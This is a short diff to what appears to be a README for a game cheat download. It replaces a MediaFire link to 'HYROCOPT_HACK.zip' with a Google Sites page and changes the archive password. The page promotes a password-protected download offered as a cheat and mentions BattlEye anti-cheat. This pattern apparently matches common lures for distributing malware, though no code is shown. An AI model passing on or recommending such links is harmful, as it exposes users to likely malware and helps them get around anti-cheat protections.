@@ -4,9 +4,9 @@
 - Windows 10/8.1/8
 # Download Cheat
 
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
+|[Download](https://sites.google.com/view/nccrakc/main-page)|
 |:-------------|
-Passwrod: 23
+Passwrod: 2077
 
 # Anti-cheat status:
 - BattlEye anti-cheat game
